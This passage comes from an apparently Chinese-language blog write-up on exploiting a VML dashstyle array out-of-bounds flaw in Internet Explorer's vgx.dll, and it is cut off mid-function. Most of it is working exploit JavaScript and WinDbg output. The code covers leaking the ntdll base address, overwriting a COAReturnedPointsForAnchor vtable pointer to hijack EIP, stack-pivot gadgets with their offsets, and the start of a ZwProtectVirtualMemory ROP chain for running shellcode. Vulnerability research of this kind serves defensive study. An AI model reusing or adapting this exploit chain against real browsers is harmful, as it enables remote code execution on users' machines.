class="keyword">var</span> length_orig = vml1.dashstyle.array.length;</span><br><span class="line">vml1.dashstyle.array.length = <span class="number">0</span> - <span class="number">1</span>;  <span class="comment">//修改length</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x400</span>; i++)&#123;  </span><br><span class="line">    marginLeftAddress_orgin = vml1.dashstyle.array.item(<span class="number">0x2E</span>+<span class="number">0x16</span>); <span class="comment">//0x2E = dashstyle长度 + COARuntimeStyle对象堆块头部(8字节)</span></span><br><span class="line">    a[i].marginLeft = <span class="string">"hpasserby"</span></span><br><span class="line">    marginLeftAddress_modify = vml1.dashstyle.array.item(<span class="number">0x2E</span>+<span class="number">0x16</span>);</span><br><span class="line">    <span class="keyword">if</span> (marginLeftAddress_orgin != marginLeftAddress_modify) &#123;  <span class="comment">//判断该对象是否紧邻于dashstyle数组</span></span><br><span class="line">        vml1.dashstyle.array.item(<span class="number">0x2E</span>+<span class="number">0x16</span>) = <span class="number">0x7ffe0300</span>;  <span class="comment">//修改指针</span></span><br><span class="line">        <span class="keyword">var</span> leak = a[i].marginLeft;</span><br><span class="line">        ntdllbase = <span class="built_in">parseInt</span>(leak.charCodeAt(<span class="number">1</span>).toString(<span class="number">16</span>) + leak.charCodeAt(<span class="number">0</span>).toString(<span class="number">16</span>), <span class="number">16</span>) - <span class="number">0x464F0</span>;</span><br><span class="line">        alert(<span class="string">"ntdllbase: 0x"</span> + ntdllbase.toString(<span class="number">16</span>));</span><br><span class="line">        vml1.dashstyle.array.item(<span class="number">0x2E</span>+<span class="number">0x16</span>) = marginLeftAddress_orgin;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><h3 id="调试笔记"><a href="#调试笔记" class="headerlink" title="调试笔记"></a>调试笔记</h3><p>首先在<code>vgx!MsoFCreateArray</code>下断，查看<code>vgx!ORG</code>对象的地址，然后运行到<code>vgx!COARuntimeStyle::put_marginLeft</code><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; bu vgx!MsoFCreateArray+0x14</span><br><span class="line">0:005&gt; bu vgx!COARuntimeStyle::put_marginLeft</span><br><span class="line">0:005&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=03f02690 ebx=0265e5d8 ecx=00000014 edx=02040048 esi=0265e5dc edi=00000101</span><br><span class="line">eip=6d82d1f3 esp=0265e530 ebp=0265e540 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</span><br><span class="line">vgx!MsoFCreateArray+0x14:</span><br><span class="line">6d82d1f3 59              pop     ecx</span><br><span class="line">0:005&gt; dd 3f02690 l8</span><br><span class="line">03f02690  000001c6 00000000 00000000 00000000</span><br><span class="line">03f026a0  00000000 00000000 2156f9af 80000000</span><br><span class="line">0:005&gt; g</span><br><span class="line">Breakpoint 2 hit</span><br><span class="line">eax=0000000a ebx=6d8852d0 ecx=6d880286 edx=001493e2 esi=0265ed48 edi=0265ea84</span><br><span class="line">eip=6d880286 esp=0265ea38 ebp=0265ea50 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">vgx!COARuntimeStyle::put_marginLeft:</span><br><span class="line">6d880286 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; dd 3f02690 l8</span><br><span class="line">03f02690  6d817258 002cffff 00040004 00000101</span><br><span class="line">03f026a0  03f32b80 00000000 2156f9af 80000000</span><br><span class="line">0:005&gt; dd 03f32b80 l100</span><br><span class="line">03f32b80  00000001 00000002 00000003 00000004</span><br><span class="line">03f32b90  00000005 00000006 00000007 00000008</span><br><span class="line">03f32ba0  00000009 0000000a 0000000b 0000000c</span><br><span class="line">03f32bb0  0000000d 0000000e 0000000f 00000010</span><br><span class="line">03f32bc0  00000011 00000012 00000013 00000014</span><br><span class="line">03f32bd0  00000015 00000016 00000017 00000018</span><br><span class="line">03f32be0  00000019 0000001a 0000001b 0000001c</span><br><span class="line">03f32bf0  0000001d 0000001e 0000001f 00000020</span><br><span class="line">03f32c00  00000021 00000022 00000023 00000024</span><br><span class="line">03f32c10  00000025 00000026 00000027 00000028</span><br><span class="line">03f32c20  00000029 0000002a 0000002b 0000002c</span><br><span class="line">03f32c30  214948dc 8c000000 01400018 00000000</span><br><span class="line">03f32c40  00000000 00000000 00000000 00000000</span><br><span class="line">03f32c50  00000000 00000000 00000000 00000000</span><br><span class="line">03f32c60  00000000 00000000 00000000 00000000</span><br><span class="line">03f32c70  00000000 00000000 00000000 00000000</span><br><span class="line">03f32c80  00000000 00000000 00000000 00000000</span><br><span class="line">03f32c90  00000000 00000000 00000000 00000000</span><br><span class="line">03f32ca0  00000000 00000000 00000000 00000000</span><br><span class="line">03f32cb0  00000000 00000000 00000000 00000000</span><br><span class="line">03f32cc0  00000000 00000000 00000000 00000000</span><br><span class="line">03f32cd0  00000000 00000000 00000000 00000000</span><br><span class="line">03f32ce0  00000001 00000000 214948c7 8c000000</span><br><span class="line">03f32cf0  01400018 00000000 00000000 00000000</span><br><span class="line">03f32d00  00000000 00000000 00000000 00000000</span><br><span class="line">03f32d10  00000000 00000000 00000000 00000000</span><br><span class="line">03f32d20  00000000 00000000 00000000 00000000</span><br><span class="line">03f32d30  00000000 00000000 00000000 00000000</span><br><span class="line">03f32d40  00000000 00000000 00000000 00000000</span><br><span class="line">03f32d50  00000000 00000000 00000000 00000000</span><br><span class="line">03f32d60  00000000 00000000 00000000 00000000</span><br><span class="line">03f32d70  00000000 00000000 00000000 00000000</span><br><span class="line">03f32d80  00000000 00000000 00000000 00000000</span><br><span class="line">03f32d90  00000000 00000000 00000001 00000000</span><br><span class="line">03f32da0  214948ee 8c000000 01400018 00000000</span><br><span class="line">03f32db0  00000000 00000000 00000000 00000000</span><br><span class="line">03f32dc0  00000000 00000000 00000000 00000000</span><br><span class="line">03f32dd0  00000000 00000000 00000000 00000000</span><br><span class="line">03f32de0  00000000 00000000 00000000 00000000</span><br><span class="line">03f32df0  00000000 00000000 00000000 00000000</span><br><span class="line">03f32e00  00000000 00000000 00000000 00000000</span><br><span class="line">03f32e10  00000000 00000000 00000000 00000000</span><br><span class="line">03f32e20  00000000 00000000 00000000 00000000</span><br><span class="line">03f32e30  00000000 00000000 00000000 00000000</span><br><span class="line">03f32e40  00000000 00000000 00000000 00000000</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p></p><p>可以观察到数组后方已经成功布局上了<code>COARuntimeStyle</code>对象<br>继续运行，浏览器弹窗时断下，查看内存<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; dd 03f32b80 l100</span><br><span class="line">03f32b80  00000001 00000002 00000003 00000004</span><br><span class="line">03f32b90  00000005 00000006 00000007 00000008</span><br><span class="line">03f32ba0  00000009 0000000a 0000000b 0000000c</span><br><span class="line">03f32bb0  0000000d 0000000e 0000000f 00000010</span><br><span class="line">03f32bc0  00000011 00000012 00000013 00000014</span><br><span class="line">03f32bd0  00000015 00000016 00000017 00000018</span><br><span class="line">03f32be0  00000019 0000001a 0000001b 0000001c</span><br><span class="line">03f32bf0  0000001d 0000001e 0000001f 00000020</span><br><span class="line">03f32c00  00000021 00000022 00000023 00000024</span><br><span class="line">03f32c10  00000025 00000026 00000027 00000028</span><br><span class="line">03f32c20  00000029 0000002a 0000002b 0000002c</span><br><span class="line">03f32c30  214948dc 8c000000 01400018 00000000</span><br><span class="line">03f32c40  00000000 00000000 00000000 00000000</span><br><span class="line">03f32c50  00000000 00000000 00000000 00000000</span><br><span class="line">03f32c60  00000000 00000000 00000000 00000000</span><br><span class="line">03f32c70  00000000 00000000 00000000 00000000</span><br><span class="line">03f32c80  00000000 00000000 00000000 00000000</span><br><span class="line">03f32c90  7ffe0300 00000000 00000000 00000000</span><br><span class="line">03f32ca0  00000000 00000000 00000000 00000000</span><br><span class="line">0:008&gt; ln poi(7ffe0300) </span><br><span class="line">(778d64f0)   ntdll!KiFastSystemCall   |  (778d64f4)   ntdll!KiFastSystemCallRet</span><br><span class="line">Exact matches:</span><br><span class="line">    ntdll!KiFastSystemCall (&lt;no parameter info&gt;)</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p></p><p>可见地址<code>0x03f32c90</code>处的地址已经被修改为<code>7ffe0300</code>，通过获取<code>marginLeft</code>就可读取处ntdll.dll中的地址。<br><img src="/post/ef2727d8/ntdll.png" alt="ntdll.png"></p><h2 id="劫持eip"><a href="#劫持eip" class="headerlink" title="劫持eip"></a>劫持eip</h2><blockquote><ol><li>当读取_anchorRect属性时，内部会调用”vgx!COAShape::get__anchorRect()”，最终创建并返回一个0x10大小的COAReturnedPointsForAnchor对象。</li><li>释放_anchorRec元素时，会调用虚表函数<br>所以，我们可以通过与前面相同得布局方式，通过溢出修改<code>COAReturnedPointsForAnchor</code>对象的虚表指针，从而在释放该对象时获取程序控制权。</li></ol></blockquote><h3 id="相关代码-1"><a href="#相关代码-1" class="headerlink" title="相关代码"></a>相关代码</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">exploit</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> vml1  = <span class="built_in">document</span>.getElementById(<span class="string">"vml1"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x400</span>; i++)&#123;</span><br><span class="line">        a[i] = <span class="built_in">document</span>.getElementById(<span class="string">"rect"</span> + i.toString())._anchorRect;</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">0x300</span>)&#123;</span><br><span class="line">            vml1.dashstyle = <span class="string">"1 2 3 4"</span>; <span class="comment">//与COAReturnedPointsForAnchor对象大小保持一致</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    vml1.dashstyle.array.length = <span class="number">0</span> - <span class="number">1</span>; </span><br><span class="line"></span><br><span class="line">    vml1.dashstyle.array.item(<span class="number">6</span>) = <span class="number">0x41414141</span>;    <span class="comment">//覆盖虚表指针</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">0x400</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">delete</span> a[i];</span><br><span class="line">        CollectGarbage();</span><br><span class="line">    &#125;</span><br><span class="line">    alert(<span class="string">"done"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="调试笔记-1"><a href="#调试笔记-1" class="headerlink" title="调试笔记"></a>调试笔记</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; g</span><br><span class="line">(fa4.a14): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax=06f8a6b0 ebx=01f12460 ecx=41414141 edx=0000008a esi=01f12460 edi=00000009</span><br><span class="line">eip=76494974 esp=0247ef14 ebp=0247ef20 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202</span><br><span class="line">OLEAUT32!VariantClear+0xb6:</span><br><span class="line">76494974 ff5108          call    dword ptr [ecx+8]    ds:0023:41414149=????????</span><br><span class="line">0:005&gt; dd eax-20</span><br><span class="line">06f8a690  6cc5ecf8 8800c248 00000001 00000002</span><br><span class="line">06f8a6a0  00000003 00000004 6cc5ecff 88000194</span><br><span class="line">06f8a6b0  41414141 06f3d9d0 00000001 00000000</span><br><span class="line">06f8a6c0  6cc5ecf2 88008cd5 6e895504 06f3dab0</span><br><span class="line">06f8a6d0  00000001 00000000 6cc5ecf1 8800c1b4</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><p>因为我们拥有获取字符串地址的能力，所以这里不需要使用堆喷技术。<br>将<code>shellcode</code>作为<code>marginLeft</code>的值，即可通过读取<code>marginLeft指针</code>泄露出它的地址。<br>然后根据泄露出来的地址生成rop链，同样的方法将生成的<code>rop链</code>写入<code>marginLefe</code>并泄露出地址。最后劫持eip到rop链上</p><h3 id="布置payload"><a href="#布置payload" class="headerlink" title="布置payload"></a>布置payload</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> vml1  = <span class="built_in">document</span>.getElementById(<span class="string">"vml1"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x400</span>; i++)&#123;</span><br><span class="line">        a[i] = <span class="built_in">document</span>.getElementById(<span class="string">"rect"</span> + i.toString())._vgRuntimeStyle;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x400</span>; i++)&#123;</span><br><span class="line">        a[i].rotation;</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">0x300</span>) &#123;</span><br><span class="line">        vml1.dashstyle = <span class="string">"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> length_orig = vml1.dashstyle.array.length;</span><br><span class="line">    vml1.dashstyle.array.length = <span class="number">0</span> - <span class="number">1</span>;   </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x400</span>; i++)&#123;  </span><br><span class="line">        marginLeftAddress_orgin = vml1.dashstyle.array.item(<span class="number">0x2E</span>+<span class="number">0x16</span>);   </span><br><span class="line">        a[i].marginLeft = <span class="built_in">unescape</span>(<span class="string">"shellcode"</span>);</span><br><span class="line">        marginLeftAddress_modify = vml1.dashstyle.array.item(<span class="number">0x2E</span>+<span class="number">0x16</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (marginLeftAddress_orgin != marginLeftAddress_modify) &#123;</span><br><span class="line">            vml1.dashstyle.array.item(<span class="number">0x2E</span>+<span class="number">0x16</span>) = <span class="number">0x7ffe0300</span>;</span><br><span class="line">            <span class="keyword">var</span> leak = a[i].marginLeft;</span><br><span class="line">            vml1.dashstyle.array.item(<span class="number">0x2E</span>+<span class="number">0x16</span>) = marginLeftAddress_orgin;</span><br><span class="line">            <span class="comment">//第一次泄露</span></span><br><span class="line">            <span class="keyword">var</span> shelladdr = marginLeftAddress_modify;</span><br><span class="line">            ntdllbase = <span class="built_in">parseInt</span>(leak.charCodeAt(<span class="number">1</span>).toString(<span class="number">16</span>) + leak.charCodeAt(<span class="number">0</span>).toString(<span class="number">16</span>), <span class="number">16</span>) - <span class="number">0x464F0</span>;</span><br><span class="line">            alert(<span class="string">"ntdllbase: 0x"</span> + ntdllbase.toString(<span class="number">16</span>));</span><br><span class="line">            alert(<span class="string">"shelladdr: 0x"</span> + shelladdr.toString(<span class="number">16</span>));</span><br><span class="line">            </span><br><span class="line">            <span class="comment">//根据shellcode的地址生成rop链</span></span><br><span class="line">            <span class="comment">//第二次泄露</span></span><br><span class="line">            <span class="keyword">var</span> rop_chain = tab2uni(get_ropchain(shelladdr));</span><br><span class="line">            a[i].marginLeft = rop_chain;</span><br><span class="line">            rop_addr = vml1.dashstyle.array.item(<span class="number">0x2E</span>+<span class="number">0x16</span>);</span><br><span class="line"></span><br><span class="line">            vml1.dashstyle.array.item(<span class="number">0x2E</span>+<span class="number">0x16</span>) = marginLeftAddress_orgin;</span><br><span class="line">            vml1.dashstyle.array.length = length_orig;</span><br><span class="line"></span><br><span class="line">            alert(<span class="string">"ropaddr: 0x"</span> + rop_addr.toString(<span class="number">16</span>));</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="栈转移"><a href="#栈转移" class="headerlink" title="栈转移"></a>栈转移</h3><p>前面<code>劫持eip部分</code>可以看到，最后的调用是<code>call dword ptr [ecx+8]</code><br>而在我们的gadget中没有<code>xchg ecx,esp</code>，所以这意味着没办法直接将栈转移到我们的rop链上。<br>但是我们可以通过越界访问，先在<code>COAReturnedPointsForAnchor</code>对象所在堆上布置好一些gadget<br>然后利用<code>xchg eax,esp; pop;</code>这种gadget，让esp先转移到堆上，然后由堆上的gadget再将栈转移到我们的rop链上。</p><h4 id="相关代码-2"><a href="#相关代码-2" class="headerlink" title="相关代码"></a>相关代码</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pivot = [</span><br><span class="line">    ntdllbase + <span class="built_in">Number</span>(<span class="number">0x0001cecb</span>),<span class="comment">//# RETN</span></span><br><span class="line">    ntdllbase + <span class="built_in">Number</span>(<span class="number">0x0001da87</span>),<span class="comment">//# POP EBX # RETN</span></span><br><span class="line">    ntdllbase + <span class="built_in">Number</span>(<span class="number">0x00046B13</span>),<span class="comment">//# XCHG EAX,ESP # POP ESI # POP EDI # LEA EAX,DWORD PTR DS:[EDX-1] # POP EBX # RETN</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">exploit</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> vml1  = <span class="built_in">document</span>.getElementById(<span class="string">"vml1"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x400</span>; i++)&#123;</span><br><span class="line">        a[i] = <span class="built_in">document</span>.getElementById(<span class="string">"rect"</span> + i.toString())._anchorRect;</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">0x300</span>)&#123;</span><br><span class="line">            vml1.dashstyle = <span class="string">"1 2 3 4"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> length_orig = vml1.dashstyle.array.length;</span><br><span class="line">    vml1.dashstyle.array.length = <span class="number">0</span> - <span class="number">1</span>; </span><br><span class="line"></span><br><span class="line">    vml1.dashstyle.array.item(<span class="number">6</span>) = rop_addr;</span><br><span class="line">    <span class="comment">//在堆上布置gadget</span></span><br><span class="line">    vml1.dashstyle.array.item(<span class="number">8</span>) = rop_addr;    <span class="comment">//rop_addr -&gt; ebx</span></span><br><span class="line">    vml1.dashstyle.array.item(<span class="number">9</span>) = ntdllbase + <span class="number">0x000cb0f8</span>;<span class="comment">//# MOV ESP,EBX # POP EBX # RETN</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">0x400</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">delete</span> a[i];</span><br><span class="line">        CollectGarbage();</span><br><span class="line">    &#125;</span><br><span class="line">    alert(<span class="string">"done"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h4><ol><li>由<code>call dword ptr [ecx+8]</code>可以知道，首先执行的是rop第三句<ol><li>交换<code>eax</code>和<code>esp</code>，栈被转移到堆上，<code>esp</code>指向<code>vml1.dashstyle.array.item(6)</code></li><li><code>pop esi; pop edi</code>，<code>esp</code>移动到<code>vml1.dashstyle.array.item(8)</code></li><li><code>pop ebx</code>，将<code>vml1.dashstyle.array.item(8)</code>中的值存入ebx，即<code>rop_addr -&gt; ebx</code></li><li><code>retn</code>，程序返回到<code>esp</code>指向的<code>vml1.dashstyle.array.item(9)</code></li></ol></li><li>执行布置在堆上的gadget<ol><li><code>mov esp,ebx</code>，因为<code>ebx</code>中使rop链的地址，栈被成功转移到rop链上。</li><li><code>pop ebx</code>，<code>esp</code>指向rop链第二句</li></ol></li><li>执行rop链第二句，<code>POP EBX</code>，将第三句弹出，防止再次栈转移</li></ol><h3 id="rop链"><a href="#rop链" class="headerlink" title="rop链"></a>rop链</h3><p>这里我们主要利用ntdll.dll中的<code>ntdll!ZwProtectVirtualMemory函数</code>来修改内存的属性。<br>要求的寄存器环境为<br></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">edi -&gt; ZwProtectVirtualMemory</span><br><span class="line">esi -&gt; return_address</span><br><span class="line">ebp -&gt; <span class="number">0xffffffff</span></span><br><span class="line">esp -&gt; ptr to BaseAddress</span><br><span class="line">ebx -&gt; ptr to NumberOfBytesToProtect</span><br><span class="line">edx -&gt; <span class="number">0x00000040</span></span><br><span class="line">ecx -&gt; ptr to OldAccessProtection</span><br></pre></td></tr></table></figure><p></p><p>这里<code>ptr to OldAccessProtection</code>可以是任意可写地址，将被用来存放以前的保护属性。<br>我们注意到，其中还存在另外2个指针数据，所以这就要求我们先将数据存储到内存中，再将其地址取出来。<br>所以这里我选择先将数据存储到ntdll.dll的<code>data</code>段，因为这里具有固定的偏移<code>0xD7000</code>，且内存可写。<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; !dh ntdll</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">SECTION HEADER #1</span><br><span class="line">   .text name</span><br><span class="line">        ...</span><br><span class="line">         Execute Read</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">SECTION HEADER #2</span><br><span class="line">      RT name</span><br><span class="line">        ...</span><br><span class="line">         Execute Read</span><br><span class="line"></span><br><span class="line">SECTION HEADER #3</span><br><span class="line">   .data name</span><br><span class="line">    806C virtual size</span><br><span class="line">   D7000 virtual address</span><br><span class="line">        ...</span><br><span class="line">         Read Write</span><br><span class="line"></span><br><span class="line">SECTION HEADER #4</span><br><span class="line">   .rsrc name</span><br><span class="line">        ...</span><br><span class="line">         Read Only</span><br><span class="line"></span><br><span class="line">SECTION HEADER #5</span><br><span class="line">  .reloc name</span><br><span class="line">        ...</span><br><span class="line">         Read Only</span><br></pre></td></tr></table></figure><p></p><h4 id="相关代码-3"><a href="#相关代码-3" class="headerlink" title="相关代码"></a>相关代码</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_ropchain</span>(<span class="params">shelladdr</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> data_off = <span class="number">0x000D7000</span> + <span class="number">0x2000</span>;</span><br><span class="line">    <span 